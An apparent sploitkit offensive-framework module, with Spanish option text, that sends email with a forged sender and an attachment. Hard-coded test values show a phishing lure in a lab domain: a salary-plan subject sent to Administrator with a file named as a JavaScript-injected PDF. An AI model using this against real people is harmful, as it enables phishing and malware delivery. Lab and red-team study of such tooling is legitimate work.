from sploitkit import *

# Import smtplib for the actual sending function
import smtplib

# For guessing MIME type
import mimetypes

# Import the email modules we'll need
import email
import email.mime
import email.mime.application
from email.mime import multipart
from email.mime import text
from email.mime.multipart import MIMEMultipart
from termcolor import colored

class send_email(Module):
	""" Module used to send simple emails.	

	Author:  your name (your email)
	Version: 1.0
	"""

	#MODULE OPTIONS
	config  = Config({
	        Option(
	            'MULTIPLE_RECIPIENTS',
	            "Colocar el valor a 'true' si deseas enviar a multiples direcciones de correo.",
	            False,
	            bool,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ): "false",
			Option(
	            'RECIPIENT_LIST',
	            "Archivo que contiene una lista de direcciones de correo electronico.",
	            False,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ): " ",
	        Option(
	            'SUBJECT',
	            "Asunto del correo.",
	            True,
	            #set_callback=lambda o: o.root._set_app_folder(),
	        ): "Subject",
	        Option(
	            'FROM',
	            "Direccion de correo electronico del remitente.",
	            True,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ): "sender@email.com",
	        Option(
	            'TO',
	            "Direccion de correo electronico del destinatario.",
	            False,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ): "recipient@email.com",
	        Option(
	            'BODY',
	            "Archivo .txt con el cuerpo del correo electronico.",
	            True,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ):  " ",
	        Option(
	            'ATTACHMENT',
	            "Ubicacion del archivo a adjuntar en el correo. Dejar en blanco si no se desea enviar ningun adjunto.",	            
	            False,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ):  " ",
	        Option(
	            'SMTP_HOST',
	            "Servidor SMTP, direccion IP o hostname.",	            
	            True,
	            #set_callback=lambda o: o.root._set_logging(o.value),
	        ):  "0.0.0.0",
	    })

	def run(self):
		subject    = ''.join(list(self.config.get('SUBJECT')))
		_from 	   = ''.join(list(self.config.get('FROM')))
		to 		   = ''.join(list(self.config.get('TO')))
		body_file  = ''.join(list(self.config.get('BODY')))
		attachment = ''.join(list(self.config.get('ATTACHMENT')))
		smtp  	   = ''.join(list(self.config.get('SMTP_HOST')))
		multi_rec  = ''.join(list(self.config.get('MULTIPLE_RECIPIENTS')))
		rec_list   = ''.join(list(self.config.get('RECIPIENT_LIST')))
		
		#TEST ARGUMENTS
		subject = 'Nuevo programa de sueldos 2021.'
		_from = 'wwhite@ecorp.local'
		to = 'Administrator@ecorp.local'
		body_file = '/home/kali/AE-temp/Prueba/inputs/body.txt'
		attachment = '/home/kali/AE-temp/Prueba/inputs/js_injected_plan2021.pdf'
		smtp = 'ecorp.local'
		multi_rec = 'true'
		rec_list = '/home/kali/AE-temp/Prueba/inputs/addrlist.txt'
		
		
		body_file = open(body_file,'r')
		body = body_file.read()

		# Create a text/plain message
		msg = email.mime.multipart.MIMEMultipart()
		msg['Subject']  = subject
		msg['From']     = _from
		msg['To'] 		= to

		print(colored('[+]','green'),'DE: '+_from)
		print(colored('[+]','green'),'ASUNTO: '+subject)

		# The main body is just another attachment
		body = email.mime.text.MIMEText(body)
		msg.attach(body)

		# Attach attachment
		if attachment != " ":
			filename = attachment
			subtype = attachment.split('.')[1]
			#print(subtype)
			fp=open(filename,'rb')
			att = email.mime.application.MIMEApplication(fp.read(),_subtype=subtype)
			fp.close()
			att.add_header('Content-Disposition','attachment',filename=attachment.split('/')[-1])
			msg.attach(att)
			print(colored('[+]','green'),'ADJUNTO: '+attachment)
		else: 
			pass

		#Send
		s = smtplib.SMTP(host=smtp)
		if multi_rec == 'false':
			s.sendmail(_from,[to], msg.as_string())
			print(colored('[+]','green'),'PARA: '+to)

		if multi_rec == 'true':
			addr_list = [line.rstrip('\n') for line in open(rec_list)]
			#f = open(rec_list,'r')
			#addr_list = f.readlines()
			s.sendmail(_from,addr_list, msg.as_string())
			print(colored('[+]','green'),'PARA : ')
			for i in addr_list:
				print(colored('[+]','green'), i)
		s.quit()
